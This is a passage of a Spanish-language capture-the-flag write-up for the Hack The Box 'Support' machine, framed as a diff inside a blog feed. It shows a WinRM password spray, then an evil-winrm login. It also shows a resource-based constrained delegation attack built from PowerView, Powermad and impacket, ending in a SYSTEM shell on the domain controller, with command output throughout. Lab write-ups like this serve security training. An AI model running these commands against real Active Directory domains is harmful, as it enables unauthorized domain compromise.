-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>evine.leopoldo:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\r</span>aven.clifton:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\b</span>ardot.mary:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\c</span>romwell.gerard:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\m</span>onroe.david:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>est.laura:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>angley.lucy:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\d</span>aughtler.mabel:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>toll.rachelle:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\f</span>ord.victoria:Ironside47pleasure40Watchful
-</code></pre></div></div>
-
-<ul>
-  <li>Nos podemos conectar gracias a que el usuario <strong>support</strong> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> support.htb <span class="nt">-u</span> support <span class="nt">-p</span> Ironside47pleasure40Watchful
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>support<span class="se">\s</span>upport
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
-05e7a42ec2aa2d13e6eaee5383b2ed97
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>
-
-<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
-
-<ul>
-  <li>
-    <p>Para enumerar la maquina y poder ver vias potenciales de elevar nuestros privilegios vamos a usar <strong>Bloodhound</strong> <a href="https://www.kali.org/tools/bloodhound/">https://www.kali.org/tools/bloodhound/</a>.</p>
-  </li>
-  <li>
-    <p>Para eso vas a necesitar descargar el <strong>.zip</strong> <a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip SharpHound-v2.3.3.zip
-Archive:  SharpHound-v2.3.3.zip
-  inflating: SharpHound.exe
-  inflating: SharpHound.exe.config
-  inflating: SharpHound.pdb
-  inflating: SharpHound.ps1
-  inflating: System.Console.dll
-  inflating: System.Diagnostics.Tracing.dll
-  inflating: System.Net.Http.dll
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo subimos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/SharpHound.exe
-
-Info: Uploading /home/miguel/Hackthebox/Support/content/SharpHound.exe to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\S</span>harpHound.exe
-
-Data: 1791316 bytes of 1791316 bytes copied
-
-Info: Upload successful!
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo ejecutamos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpHound.exe <span class="nt">-c</span> All
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora tenemos el comprimido.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">ls
-
-
-    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments
-
-
-Mode                 LastWriteTime         Length Name
-<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
-<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
-<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin
-
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Ese <code class="language-plaintext highlighter-rouge">.zip</code> lo vamos a subir a <code class="language-plaintext highlighter-rouge">BloodHound</code> vamos a descargarlo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; download C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip info.zip
-
-Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip to info.zip
-
-Info: Download successful!
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos que hay un grupo que se llama <strong>Shared Support Accounts</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; net group
-
-Group Accounts <span class="k">for</span> <span class="se">\\</span>
-
-<span class="nt">-------------------------------------------------------------------------------</span>
-<span class="k">*</span>Cloneable Domain Controllers
-<span class="k">*</span>DnsUpdateProxy
-<span class="k">*</span>Domain Admins
-<span class="k">*</span>Domain Computers
-<span class="k">*</span>Domain Controllers
-<span class="k">*</span>Domain Guests
-<span class="k">*</span>Domain Users
-<span class="k">*</span>Enterprise Admins
-<span class="k">*</span>Enterprise Key Admins
-<span class="k">*</span>Enterprise Read-only Domain Controllers
-<span class="k">*</span>Group Policy Creator Owners
-<span class="k">*</span>Key Admins
-<span class="k">*</span>Protected Users
-<span class="k">*</span>Read-only Domain Controllers
-<span class="k">*</span>Schema Admins
-<span class="k">*</span>Shared Support Accounts
-The <span class="nb">command </span>completed with one or more errors.
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Podemos ver eso en <strong>Bloodhound</strong>.</p>
-  </li>
-  <li>
-    <p>El grupo <code class="language-plaintext highlighter-rouge">SHARED SUPPORT ACCOUNTS</code> tiene <code class="language-plaintext highlighter-rouge">GenericAll</code> en el <code class="language-plaintext highlighter-rouge">DC</code> .</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/support/priv.png" />
-</p>
-
-<h1 id="resource-based-constrained-delegation-attack">Resource based constrained delegation attack</h1>
-
-<ul>
-  <li>
-    <p>En este post nos explican como funciona todo <a href="https://github.com/tothi/rbcd-attack">https://github.com/tothi/rbcd-attack</a>, <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation</a>.</p>
-  </li>
-  <li>
-    <p>Para explotar esto necesitaremos de lo siguiente <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>, <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1</a>.</p>
-  </li>
-  <li>
-    <p>Ahora lo subimos ala maquina y lo importamos para que lo interprete.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/PowerView.ps1
-
-Info: Uploading /home/miguel/Hackthebox/Support/content/PowerView.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owerView.ps1
-
-Data: 1027036 bytes of 1027036 bytes copied
-
-Info: Upload successful!
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">dir
-
-
-    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments
-
-
-Mode                 LastWriteTime         Length Name
-<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
-<span class="nt">-a----</span>         3/29/2024   2:34 PM         770279 PowerView.ps1
-<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
-<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin
-
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owerView.ps1
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/Powermad.ps1
-
-Info: Uploading /home/miguel/Hackthebox/Support/content/Powermad.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owermad.ps1
-
-Data: 180768 bytes of 180768 bytes copied
-
-Info: Upload successful!
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owermad.ps1
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a comenzar creando un <strong>Computer object</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; New-MachineAccount <span class="nt">-MachineAccount</span> Nuevo <span class="nt">-Password</span> <span class="si">$(</span>ConvertTo-SecureString <span class="s1">'123456'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span><span class="si">)</span> <span class="nt">-Verbose</span>
-Verbose: <span class="o">[</span>+] Domain Controller <span class="o">=</span> dc.support.htb
-Verbose: <span class="o">[</span>+] Domain <span class="o">=</span> support.htb
-Verbose: <span class="o">[</span>+] SAMAccountName <span class="o">=</span> Nuevo<span class="err">$</span>
-Verbose: <span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
-<span class="o">[</span>+] Machine account Nuevo added
-</code></pre></div></div>
-
-<ul>
-  <li>Comprobamos que exista.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer Nuevo
-
-
-pwdlastset             : 3/29/2024 2:39:18 PM
-logoncount             : 0
-badpasswordtime        : 12/31/1600 4:00:00 PM
-distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
-objectclass            : <span class="o">{</span>top, person, organizationalPerson, user...<span class="o">}</span>
-name                   : Nuevo
-objectsid              : S-1-5-21-1677581083-3380853377-188903654-6101
-samaccountname         : Nuevo<span class="err">$</span>
-localpolicyflags       : 0
-codepage               : 0
-samaccounttype         : MACHINE_ACCOUNT
-accountexpires         : NEVER
-countrycode            : 0
-whenchanged            : 3/29/2024 9:39:18 PM
-instancetype           : 4
-usncreated             : 90263
-objectguid             : df9abf14-106b-4628-af15-0893a1ecf055
-lastlogon              : 12/31/1600 4:00:00 PM
-lastlogoff             : 12/31/1600 4:00:00 PM
-objectcategory         : <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
-dscorepropagationdata  : 1/1/1601 12:00:00 AM
-serviceprincipalname   : <span class="o">{</span>RestrictedKrbHost/Nuevo, HOST/Nuevo, RestrictedKrbHost/Nuevo.support.htb, HOST/Nuevo.support.htb<span class="o">}</span>
-ms-ds-creatorsid       : <span class="o">{</span>1, 5, 0, 0...<span class="o">}</span>
-badpwdcount            : 0
-cn                     : Nuevo
-useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
-whencreated            : 3/29/2024 9:39:18 PM
-primarygroupid         : 515
-iscriticalsystemobject : False
-usnchanged             : 90265
-dnshostname            : Nuevo.support.htb
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a seguir con los pasos que nos dan.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$ComputerSid</span> <span class="o">=</span> Get-DomainComputer Nuevo <span class="nt">-Properties</span> objectsid | Select <span class="nt">-Expand</span> objectsid
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="nt">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="si">$(</span><span class="nv">$ComputerSid</span><span class="si">)</span><span class="s2">)"</span>
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte[] <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer dc | Set-DomainObject <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora usaremos impacket para obtener un ticket suplantando al Administrator.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getST <span class="nt">-spn</span> cifs/dc.support.htb <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> 10.129.245.29 support.htb/Nuevo<span class="nv">$:</span>123456
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-<span class="o">[</span>-] CCache file is not found. Skipping...
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2self
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2Proxy
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a exportar la variable de entorno con el nombre del ticket.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora ya nos podemos conectar y leer la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec <span class="nt">-k</span> dc.support.htb
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on dc.support.htb.....
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file GoDYfrro.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on dc.support.htb.....
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service tmuw on dc.support.htb.....
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service tmuw.....
-<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
-Microsoft Windows <span class="o">[</span>Version 10.0.20348.859]
-<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
-</span>nt authority<span class="se">\s</span>ystem
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
-7088702023ddab61e77faaf6ac6fcbc2
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry></feed>
